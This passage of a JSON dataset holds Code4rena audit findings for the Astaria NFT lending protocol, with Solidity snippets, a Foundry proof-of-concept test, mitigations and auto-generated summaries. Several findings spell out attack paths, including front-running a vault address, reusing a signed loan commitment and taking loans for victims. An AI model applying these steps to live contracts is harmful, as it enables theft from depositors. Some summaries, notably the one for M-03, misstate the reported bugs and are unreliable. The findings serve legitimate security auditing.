confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/486)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the `ERC4626Cloned.deposit` and `ERC4626Cloned.mint` functions of the Astaria project. These functions have `require(shares > minDepositAmount(), \"VALUE_TOO_SMALL\")` and `require(assets > minDepositAmount(), \"VALUE_TOO_SMALL\")` as the minimum deposit requirement, respectively. For a public vault, when the share price becomes different than 1, these functions' minimum deposit requirements are no longer the same. This can result in unexpected deposit amounts and degraded filtering of who can participate as a liquidity provider.\n\nTo test this bug, a test was added to `src\\test\\AstariaTest.t.sol` which passes to demonstrate the described scenario. To mitigate this issue, the `ERC4626Cloned.deposit` function can be updated to directly compare the `assets` input to `minDepositAmount()` for the minimum deposit requirement while keeping the `ERC4626Cloned.mint` function as is. Alternatively, the `ERC4626Cloned.mint` function can be updated to directly compare the `shares` input to `minDepositAmount()` for the minimum deposit requirement while keeping the `ERC4626Cloned.deposit` function as is. This was confirmed by SantiagoGregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/486",
      "tags": [
        "EIP-4626",
        "ERC4626"
      ],
      "finders": [
        "csanuragjain",
        "rbserver",
        "bin2chen",
        "0xcm",
        "synackrst",
        "caventa",
        "unforgiven",
        "0Kage"
      ]
    },
    {
      "id": "25821",
      "title": "[M-05] Users are unable to mint shares from a public vault using `AstariaRouter` contract when share price is bigger than one",
      "impact": "MEDIUM",
      "content": "\nFor a public vault, calling the `AstariaRouter.mint` function calls the following `ERC4626RouterBase.mint` function and then the `ERC4626Cloned.mint` function below. After user actions like borrowing and repaying after some time, the public vault's share price can become bigger than 1 so `ERC4626Cloned.previewMint` function's execution of `shares.mulDivUp(totalAssets(), supply)` would return `assets` that is bigger than `shares`; then, calling the `ERC4626Cloned.mint` function would try to transfer this `assets` from `msg.sender` to the public vault. When the `AstariaRouter.mint` function is called, this `msg.sender` is the `AstariaRouter` contract. However, because the `AstariaRouter.mint` function only approves the public vault for transferring `shares` of the asset token on behalf of the router, the `ERC4626Cloned.mint` function's transfer of `assets` of the asset token would fail due to the insufficient asset token allowance. Hence, when the public vault's share price is bigger than 1, users are unable to mint shares from the public vault using the `AstariaRouter` contract and cannot utilize the slippage control associated with the `maxAmountIn` input.\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L15-L25>\n\n```solidity\n  function mint(\n    IERC4626 vault,\n    address to,\n    uint256 shares,\n    uint256 maxAmountIn\n  ) public payable virtual override returns (uint256 amountIn) {\n    ERC20(vault.asset()).safeApprove(address(vault), shares);\n    if ((amountIn = vault.mint(shares, to)) > maxAmountIn) {\n      revert MaxAmountError();\n    }\n  }\n```\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L38-L52>\n\n```solidity\n  function mint(\n    uint256 shares,\n    address receiver\n  ) public virtual returns (uint256 assets) {\n    assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n    require(assets > minDepositAmount(), \"VALUE_TOO_SMALL\");\n    // Need to transfer before minting or ERC777s could reenter.\n    ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n\n    afterDeposit(assets, shares);\n  }\n```\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L129-L133>\n\n```solidity\n  function previewMint(uint256 shares) public view virtual returns (uint256) {\n    uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.\n\n    return supply == 0 ? 10e18 : shares.mulDivUp(totalAssets(), supply);\n  }\n```\n\n### Proof of Concept\n\nPlease add the following test in `src\\test\\AstariaTest.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n  function testUserFailsToMintSharesFromPublicVaultUsingRouterWhenSharePriceIsBiggerThanOne() public {\n    uint256 amountIn = 50 ether;\n    address alice = address(1);\n    address bob = address(2);\n    vm.deal(bob, amountIn);\n\n    TestNFT nft = new TestNFT(2);\n    _mintNoDepositApproveRouter(address(nft), 5);\n    address tokenContract = address(nft);\n    uint256 tokenId = uint256(0);\n\n    address publicVault = _createPublicVault({\n      strategist: strategistOne,\n      delegate: strategistTwo,\n      epochLength: 14 days\n    });\n\n    // after alice deposits 50 ether WETH in publicVault, publicVault's share price becomes 1\n    _lendToVault(Lender({addr: alice, amountToLend: amountIn}), publicVault);\n\n    // the borrower borrows 10 ether WETH from publicVault\n    (, ILienToken.Stack[] memory stack1) = _commitToLien({\n      vault: publicVault,\n      strategist: strategistOne,\n      strategistPK: strategistOnePK,\n      tokenContract: tokenContract,\n      tokenId: tokenId,\n      lienDetails: standardLienDetails,\n      amount: 10 ether,\n      isFirstLien: true\n    });\n    uint256 collateralId = tokenContract.computeId(tokenId);\n\n    // the borrower repays for the lien after 9 days, and publicVault's share price becomes bigger than 1\n    vm.warp(block.timestamp + 9 days);\n    _repay(stack1, 0, 100 ether, address(this));\n\n    vm.startPrank(bob);\n\n    // bob owns 50 ether WETH\n    WETH9.deposit{value: amountIn}();\n    WETH9.transfer(address(ASTARIA_ROUTER), amountIn);\n\n    // bob wants to mint 1 ether shares from publicVault using the router but fails\n    vm.expectRevert(bytes(\"TRANSFER_FROM_FAILED\"));\n    ASTARIA_ROUTER.mint(\n      IERC4626(publicVault),\n      bob,\n      1 ether,\n      type(uint256).max\n    );\n\n    vm.stopPrank();\n  }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIn the `ERC4626RouterBase.mint` function, the public vault's `previewMint` function can be used to get an `assetAmount` for the `shares` input.<br>\n<https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L21> can then be updated to the following code.\n\n```solidity\n    ERC20(vault.asset()).safeApprove(address(vault), assetAmount);\n```\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes an issue with the `AstariaRouter.mint` function when the public vault's share price is bigger than 1. When this occurs, users are unable to mint shares from the public vault using the `AstariaRouter` contract and cannot utilize the slippage control associated with the `maxAmountIn` input. The issue is caused by the `ERC4626Cloned.mint` function trying to transfer an `assets` amount from `msg.sender` to the public vault, which is the `AstariaRouter` contract in this case. However, the `AstariaRouter.mint` function only approves the public vault for transferring `shares` of the asset token on behalf of the router, causing the transfer of `assets` to fail due to the insufficient asset token allowance. \n\nThe recommended mitigation step is to update the `ERC4626RouterBase.mint` function to use the public vault's `previewMint` function to get an `assetAmount` for the `shares` input. This can be done by changing <https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L21> to the following code.\n\n```solidity\n    ERC20(vault.asset()).safeApprove(address(vault), assetAmount);\n```\n\nIn addition, to demonstrate the described scenario, a test can be added to `src\\test\\AstariaTest.t.sol`. The code for the test is provided in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/488",
      "tags": [],
      "finders": [
        "rbserver",
        "cccz",
        "Jeiwan",
        "chaduke",
        "adriro",
        "unforgiven",
        "rvierdiiev"
      ]
    },
    {
      "id": "25820",
      "title": "[M-04] `LienToken.transferFrom` There is a possibility of malicious attack",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L366-L368>\n\nCorrupt multiple key properties of public vault, causing vault not to function properly.\n\n### Proof of Concept\n\nWhen LienToken.makePayment()/buyoutLien()/payDebtViaClearingHouse()<br>\nIf it corresponds to PublicVault, it will make multiple changes to the vault, such as: yIntercept, slope, last, epochData, etc.\n\nIf LienToken corresponds to PublicVault, then ownerOf(lienId) = PublicVault address\n\nWhen the LienToken is a private vault, it is possible to transfer the owner of the LienToken.\n\nAs the above seems, if the private vault is transferred to the PublicVault address will result in the wrong modification of the yIntercept, slope, last, epochData, etc.\n\nSo we restrict the to in transferFrom to not be a PublicVault address\n\n```solidity\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 id\n  ) public override(ERC721, IERC721) {\n\n    if (_isPublicVault(s, to)) {  //***@audit when to == PublicVault address , will revert\n      revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);  \n    }  \n```\n\nHowever, such a restriction does not prevent an attacker from transferring PrivateVault's LienToken to PublicVault.<br>\nBecause the address is predictable when the vault contract is created, a malicious user can predict the vault address, front-run, and transfer PrivateVault's LienToken to the predicted PublicVault address before the public vault is created, thus bypassing this restriction\n\nAssumptions:\n\n1.  alice creates PrivateVault, and creates multiple PrivateVault's LienToken\n2.  alice monitors bob's creation of the PublicVault transaction, i.e., AstariaRouter.newPublicVault(), and then predicts the address of the newly generated treasure chest\n\nNote: newPublicVAult() although the use of create(), but still can predict the address\n\nsee：<https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed>\n\n> The address for an Ethereum contract is deterministically computed from the address of its creator (sender) and how many transactions the creator has sent (nonce). The sender and nonce are RLP encoded and then hashed with Keccak-256.\n\n3. front-run , and transfer LienToken to public vault predict address\n4. bob's public vault created success and do some loan\n5. alice do makePayment() to Corrupt bob's public vault\n\n### Recommended Mitigation Steps\n\nThe corresponding vault address is stored in s.lienMeta\\[id].orginOwner when the LienToken is created, this is not modified. Get the vault address from this variable, not from ownerOf(id).\n\n**[androolloyd (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/571)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been found in the LienToken.sol code which affects the public vault properties, causing it to malfunction. The bug occurs when the LienToken.makePayment()/buyoutLien()/payDebtViaClearingHouse() functions are used and corresponds to a PublicVault. This results in multiple changes to the vault, such as the yIntercept, slope, last, epochData, etc. It is possible for a malicious user to transfer the owner of the LienToken from a private vault to a PublicVault address, which would result in the wrong modification of the vault properties. \n\nThe recommended mitigation step is to store the vault address in the s.lienMeta[id].orginOwner variable when the LienToken is created, as this is not modified. The vault address should be retrieved from this variable, instead of from the ownerOf(id). This has been confirmed by androolloyd (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/571",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "25819",
      "title": "[M-03] `settleAuction()` Check for status errors",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L526-L534>\n\nClearingHouse.safeTransferFrom() to execute successfully even if there is no bid.\n\n### Proof of Concept\n\nsettleAuction is called at the end of the auction and will check if the status is legal\n\n```solidity\n\n  function settleAuction(uint256 collateralId) public {\n    if (\n      s.collateralIdToAuction[collateralId] == bytes32(0) &&\n      ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n        s.idToUnderlying[collateralId].tokenId\n      ) !=\n      s.clearingHouse[collateralId]\n    ) {\n      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n    }\n```\n\nThis check seems to be miswritten，The normal logic would be\n\n```solidity\ns.collateralIdToAuction[collateralId] == bytes32(0) || ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n        s.idToUnderlying[collateralId].tokenId\n      ) == s.clearingHouse[collateralId]\n```\n\nThis causes ClearingHouse.safeTransferFrom() to execute successfully even if there is no bid.\n\n### Recommended Mitigation Steps\n\n```solidity\n\n  function settleAuction(uint256 collateralId) public {\n    if (\n-     s.collateralIdToAuction[collateralId] == bytes32(0) &&\n-    ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n-        s.idToUnderlying[collateralId].tokenId\n-      ) !=\n-      s.clearingHouse[collateralId]\n+      s.collateralIdToAuction[collateralId] == bytes32(0) || \n+       ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(s.idToUnderlying[collateralId].tokenId\n+      ) == \n+      s.clearingHouse[collateralId]\n    ) {\n      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n    }\n```\n\n**[androolloyd (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/582)**\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/582#issuecomment-1439153219):**\n > Keeping medium severity despite the lack of clear impact, the lack of clear impact being due to flaws in the flow before these lines.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the ClearingHouse.safeTransferFrom() function in the CollateralToken.sol code. The function is supposed to execute successfully even if there is no bid, but the code has a miswritten check that prevents this from happening. The normal logic should be that the collateralIdToAuction is equal to bytes32(0) OR the owner of the tokenId is equal to the ClearingHouse. The recommended mitigation step is to replace the miswritten code with the correct code, so that the function can execute successfully. The bug was confirmed by androolloyd (Astaria) and commented on by Picodes (judge), who determined the severity of the bug to be of medium despite the lack of clear impact.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/582",
      "tags": [],
      "finders": [
        "bin2chen",
        "kaden"
      ]
    },
    {
      "id": "25818",
      "title": "[M-02] `_buyoutLien()` does not properly validate the liquidationInitialAsk",
      "impact": "MEDIUM",
      "content": "\nIllegal liquidationInitialAsk, resulting in insufficient bids to cover the debt.\n\n### Proof of Concept\n\n\\_buyoutLien() will validate against liquidationInitialAsk, but incorrectly uses the old stack for validation\n\n```solidity\n  function _buyoutLien(\n    LienStorage storage s,\n    ILienToken.LienActionBuyout calldata params\n  ) internal returns (Stack[] memory newStack, Stack memory newLien) {\n\n....\n\n    uint256 potentialDebt = 0;\n    for (uint256 i = params.encumber.stack.length; i > 0; ) {\n      uint256 j = i - 1;\n      // should not be able to purchase lien if any lien in the stack is expired (and will be liquidated)\n      if (block.timestamp >= params.encumber.stack[j].point.end) {\n        revert InvalidState(InvalidStates.EXPIRED_LIEN);\n      }\n\n      potentialDebt += _getOwed(\n        params.encumber.stack[j],\n        params.encumber.stack[j].point.end\n      );\n\n      if (\n        potentialDebt >\n        params.encumber.stack[j].lien.details.liquidationInitialAsk   //1.****@audit use old stack\n      ) {\n        revert InvalidState(InvalidStates.INITIAL_ASK_EXCEEDED);\n      }\n\n      unchecked {\n        --i;\n      }\n    }  \n....\n    newStack = _replaceStackAtPositionWithNewLien(\n      s,\n      params.encumber.stack,\n      params.position,\n      newLien,\n      params.encumber.stack[params.position].point.lienId    //2.****@audit replace newStack\n    );    \n```\n\n### Recommended Mitigation Steps\n\nReplace then verify, using the newStack\\[] for verification.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/587)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes an issue with the _buyoutLien() function in the Astaria smart contract. This function is used to validate against liquidationInitialAsk, however, it incorrectly uses the old stack for validation instead of the new stack. This could result in insufficient bids to cover the debt, leading to illegal liquidation.\n\nThe recommended mitigation steps for this issue are to replace then verify, using the newStack[] for verification. This was confirmed by SantiagoGregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/587",
      "tags": [],
      "finders": [
        "bin2chen",
        "chaduke"
      ]
    },
    {
      "id": "25817",
      "title": "[M-01] A user can use the same proof for a commitment more than 1 time",
      "impact": "MEDIUM",
      "content": "\nA user can use the same commitment signature and merkleData more than 1 time to obtain another loan.\n\n### Proof of Concept\n\nA user needs to make some procedures to take a loan against an NFT.<br>\nNormally the user calls commitToLiens() in AstariaRouter.sol providing IAstariaRouter.Commitment\\[] as input.<br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L490>\n\nThe function will transfer the NFT to the CollateralToken contract to get a collateral id for the user (see CollateralToken.onERC721Received() ).\n\nAfter that, the function in the router will make an internal call \\_executeCommitment() for each commitment.<br>\n\\_executeCommitment() checks the collateral id and the commitment.lienRequest.strategy.vault and then calls commitToLien in\ncommitment.lienRequest.strategy.vault with the commitment and the router address as the receiver (ie: address (this)).\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L761>\n\n\\_executeCommitment() in AstariaRouter.sol\n\n```solidity\n  function _executeCommitment(\n    RouterStorage storage s,\n    IAstariaRouter.Commitment memory c\n  )\n    internal\n    returns (\n      uint256,\n      ILienToken.Stack[] memory stack,\n      uint256 payout\n    )\n  {\n    uint256 collateralId = c.tokenContract.computeId(c.tokenId);\n\n    if (msg.sender != s.COLLATERAL_TOKEN.ownerOf(collateralId)) {\n      revert InvalidSenderForCollateral(msg.sender, collateralId);\n    }\n    if (!s.vaults[c.lienRequest.strategy.vault]) {\n      revert InvalidVault(c.lienRequest.strategy.vault);\n    }\n    //router must be approved for the collateral to take a loan,\n    return\n      IVaultImplementation(c.lienRequest.strategy.vault).commitToLien( // HERE\n        c,\n        address(this)\n      );\n  }\n```\n\ncommitToLien() function in VaultImplementation:\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L287>\n\n```solidity\n  function commitToLien( \n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  )\n    external\n    whenNotPaused\n    returns (uint256 lienId, ILienToken.Stack[] memory stack, uint256 payout)\n  {\n    _beforeCommitToLien(params);\n    uint256 slopeAddition;\n    (lienId, stack, slopeAddition, payout) = _requestLienAndIssuePayout(\n      params,\n      receiver\n    );\n    _afterCommitToLien(\n      stack[stack.length - 1].point.end,\n      lienId,\n      slopeAddition\n    );\n  }\n```\n\nThe function in the Vault will among other things request a lien position and issue the payout to the user requesting the loan via\n\\_requestLienAndIssuePayout().<br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L379>\n\nThis function validates the commitment with the signature against the address of the owner of the vault or the delegate.<br>\nTo recover the address with ecrecover an auxiliary function is used to encode the strategy data `(_encodeStrategyData() )` but the strategy.vault is not being taken into account in the bytes returned nor the strategy version.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L229>\n\n```solidity\n  function _validateCommitment( \n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  ) internal view {\n    uint256 collateralId = params.tokenContract.computeId(params.tokenId); \n    ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));   \n    address holder = CT.ownerOf(collateralId);\n    address operator = CT.getApproved(collateralId);\n    if (\n      msg.sender != holder &&\n      receiver != holder && \n      receiver != operator &&\n      !CT.isApprovedForAll(holder, msg.sender)\n    ) {\n      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n    }\n    VIData storage s = _loadVISlot();\n    address recovered = ecrecover(\n      keccak256(\n        _encodeStrategyData(\n          s,\n          params.lienRequest.strategy,     \n          params.lienRequest.merkle.root    \n        )\n      ),\n      params.lienRequest.v,\n      params.lienRequest.r,\n      params.lienRequest.s\n    );\n    if (\n      (recovered != owner() && recovered != s.delegate) ||\n      recovered == address(0)\n    ) {\n      revert IVaultImplementation.InvalidRequest(\n        InvalidRequestReason.INVALID_SIGNATURE\n      );\n    }\n  }\n```\n\nSo \\_validateCommitment will not revert if I use it with little changes in the Commitment like strategy.vault because there are not going to be changes in \\_encodeStrategyData().<br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L178>\n\nWe saw that the user started the operation in Router but he could have called directly commitToLien in the vault after manually transferring the NFT to Collateral.sol and obtaining the collateral token. Then strategy.vault and strategy.version can be changed by the user breaking the invariant  ***commitment.strategy.vault == vault where commitToLiens() is being called*** and the vault will not notice it and will consider the signature of the commitment as valid.\n\nSo the procedure will be the following:\n\n*   User takes a loan against an NFT via Router with a valid commitment\n\n*   User uses the same commitment but takes a loan manually by calling the Vault and CollateralToken contracts changing 2 things:\n\n    1. The Commitment.lienRequest.strategy.vault, will make a different newLienId = uint256(keccak256(abi.encode(params.lien))); from the previous one. If this change is not made the transaction will fail to try to mint the same id. \n\n    2. The other change needed to avoid the transaction from failing is the lienRequest.stack provided because the LienToken contract keeps in his storage a track of collateralId previous transactions ( mapping(uint256 => bytes32) collateralStateHash;). So the only thing we need to do is add to stack the previous transaction to avoid validateStack() from reverting.\n\n```solidity\n  modifier validateStack(uint256 collateralId, Stack[] memory stack) {\n    LienStorage storage s = _loadLienStorageSlot();\n    bytes32 stateHash = s.collateralStateHash[collateralId];\n    if (stateHash == bytes32(0) && stack.length != 0) {\n      revert InvalidState(InvalidStates.EMPTY_STATE);\n    }\n    if (stateHash != bytes32(0) && keccak256(abi.encode(stack)) != stateHash) {\n      revert InvalidState(InvalidStates.INVALID_HASH);\n    }\n    _;\n  }\n```\n\n*   The signature check via ecrecover done in VaultImplementation will succeed both times (explained before why).\n\nThere´s one more check of the commitment to verify: the StrategyValidator one with the nlrDetails and the merkle. This is done in the Router contract by \\_validateCommitment().\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L434>\n\nThis will call validateAndParse on the validators contract `(address strategyValidator = s.strategyValidators[nlrType];)`.\n\nThis validation and parse will depend on the validator but we have examples like UNI_V3Validator.sol\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/strategies/UNI_V3Validator.sol#L80>\n\nThis function makes some checks but if those checks passed the first time they will pass the second because the changes done\n(strategy.vault and stack) are not checked here.<br>\nThe leaf returned is `leaf = keccak256(params.nlrDetails)`, and it will be checked against the root and the proof.\n\nA portion of code of \\_validateCommitment in AstariaRouter:\n\n```solidity\n(bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator(\n      strategyValidator\n    ).validateAndParse(\n        commitment.lienRequest, // validates nlrDetails\n        s.COLLATERAL_TOKEN.ownerOf(\n          commitment.tokenContract.computeId(commitment.tokenId)\n        ),\n        commitment.tokenContract,\n        commitment.tokenId\n      );\n\n    if (details.rate == uint256(0) || details.rate > s.maxInterestRate) {\n      revert InvalidCommitmentState(CommitmentState.INVALID_RATE);\n    }\n\n    if (details.maxAmount < commitment.lienRequest.amount) {    \n      revert InvalidCommitmentState(CommitmentState.INVALID_AMOUNT);\n    }\n\n    if (\n      !MerkleProofLib.verify(\n        commitment.lienRequest.merkle.proof,\n        commitment.lienRequest.merkle.root,\n        leaf\n      )\n    ) {\n      revert InvalidCommitmentState(CommitmentState.INVALID);\n    }\n```\n\n### Recommended Mitigation Steps\n\nYou can add a nonce for the user and increment it each time he takes a loan.\n\n**[androolloyd (Astaria) disputed via duplicate issue `#140` and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/140#issuecomment-1413614383):**\n> Nonce increments are done manually by the user when they want to invalidate any terms that used that nonce, much like seaport does.\n\n**[Picodes (judge) commented via duplicate issue `#140`](https://github.com/code-423n4/2023-01-astaria-findings/issues/140#issuecomment-1441345319):**\n> It's great to have a way to increment the nonce manually, invalidating all orders, but in the case of Astaria, how could one say \"I am ok for these terms, but only once\"?\n>\n> Currently, if there is a path to accept multiple times the same terms, I do consider it a valid medium severity issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a user being able to use the same commitment signature and merkleData more than once to obtain another loan. The user needs to make some procedures to take a loan against an NFT, which involves calling commitToLiens() in AstariaRouter.sol. The function will transfer the NFT to the CollateralToken contract to get a collateral id for the user. After that, the function in the router will make an internal call to \\_executeCommitment() for each commitment. This function checks the collateral id and the commitment.lienRequest.strategy.vault and then calls commitToLien in commitment.lienRequest.strategy.vault with the commitment and the router address as the receiver.\n\nThe function in the Vault will among other things request a lien position and issue the payout to the user requesting the loan via \\_requestLienAndIssuePayout(). This function validates the commitment with the signature against the address of the owner of the vault or the delegate. To recover the address with ecrecover an auxiliary function is used to encode the strategy data but the strategy.vault is not being taken into account in the bytes returned nor the strategy version. This means that the signature check via ecrecover done in VaultImplementation will succeed both times.\n\nThe user can then use the same commitment but take a loan manually by calling the Vault and CollateralToken contracts, changing the Commitment.lienRequest.strategy.vault and the lienRequest.stack provided. This will allow the user to take a loan multiple times without the Vault noticing it.\n\nThe bug report also mentions that there is one more check of the commitment to verify, the StrategyValidator one with the nlrDetails and the merkle. This is done in the Router contract by \\_validateCommitment(), which calls validateAndParse on the validators contract. This validation and parse will depend on the validator, but it does not check for the changes made, meaning the user will be able to take the loan multiple times.\n\nThe bug report recommends adding a nonce for the user and incrementing it each time they take a loan. This would invalidate any terms that used that nonce, much like seaport does. This would allow users to say \"I am ok for these terms, but only once\".",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/589",
      "tags": [],
      "finders": [
        "m9800",
        "ladboy233"
      ]
    },
    {
      "id": "25816",
      "title": "[H-21] Attacker can take loan for Victim",
      "impact": "HIGH",
      "content": "\nAn unapproved, non-owner of collateral can still take loan for the owner/operator of collateral even when owner did not needed any loan. This is happening due to incorrect checks as shown in POC. This leads to unintended loan and associated fees for users.\n\n### Proof of Concept\n\n1.  A new loan is originated via `commitToLien` function by User X. Params used by User X are as below:\n\n```\ncollateralId = params.tokenContract.computeId(params.tokenId) = 1\n\nCT.ownerOf(1) = User Y\n\nCT.getApproved(1) = User Z\n\nCT.isApprovedForAll(User Y, User X) = false\n\nreceiver = User Y\n```\n\n2.  This internally make call to `_requestLienAndIssuePayout` which then calls `_validateCommitment` function for signature verification\n3.  Lets see the signature verification part in `_validateCommitment` function\n\n```\n\n      function _validateCommitment(\n        IAstariaRouter.Commitment calldata params,\n        address receiver\n      ) internal view {\n        uint256 collateralId = params.tokenContract.computeId(params.tokenId);\n        ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));\n        address holder = CT.ownerOf(collateralId);\n        address operator = CT.getApproved(collateralId);\n        if (\n          msg.sender != holder &&\n          receiver != holder &&\n          receiver != operator &&\n          !CT.isApprovedForAll(holder, msg.sender)\n        ) {\n          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n        }\n        VIData storage s = _loadVISlot();\n        address recovered = ecrecover(\n          keccak256(\n            _encodeStrategyData(\n              s,\n              params.lienRequest.strategy,\n              params.lienRequest.merkle.root\n            )\n          ),\n          params.lienRequest.v,\n          params.lienRequest.r,\n          params.lienRequest.s\n        );\n        if (\n          (recovered != owner() && recovered != s.delegate) ||\n          recovered == address(0)\n        ) {\n          revert IVaultImplementation.InvalidRequest(\n            InvalidRequestReason.INVALID_SIGNATURE\n          );\n        }\n      }\n```\n\n4.  Ideally the verification should fail since :\n\na. User X is not owner of passed collateral<br>\nb. User X is not approved for this collateral<br>\nc. User X is not approved for all of User Y token\n\n5.  But observe the below if condition doing the required check:\n\n```\n\n    uint256 collateralId = params.tokenContract.computeId(params.tokenId);\n        ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));\n        address holder = CT.ownerOf(collateralId);\n        address operator = CT.getApproved(collateralId);\n    if (\n          msg.sender != holder &&\n          receiver != holder &&\n          receiver != operator &&\n          !CT.isApprovedForAll(holder, msg.sender)\n        ) {\n          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n        }\n```\n\n6.  In our case this if condition does not execute since receiver = holder\n\n```\n\n    if (\n          msg.sender != holder && // true since User X is not the owner\n          receiver != holder && // false since attacker passed receiver as User Y which is owner of collateral, thus failing this if condition \n          receiver != operator &&\n          !CT.isApprovedForAll(holder, msg.sender)\n        ) {\n          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n        }\n```\n\n7.  This means the signature verification passes and loan is issued for collateral owner without his wish\n\n### Recommended Mitigation Steps\n\nRevise the condition as shown below:\n\n    if (\n          msg.sender != holder &&\n          msg.sender != operator &&\n          !CT.isApprovedForAll(holder, msg.sender)\n        ) {\n          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n        }\n\n    if (\n          receiver != holder &&\n          receiver != operator \n        ) {\n          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n        }\n\n**[SantiagoGregory (Astaria) confirmed via duplicate issue `#565`](https://github.com/code-423n4/2023-01-astaria-findings/issues/565#event-8369712722)**\n\n\n\n***\n \n",
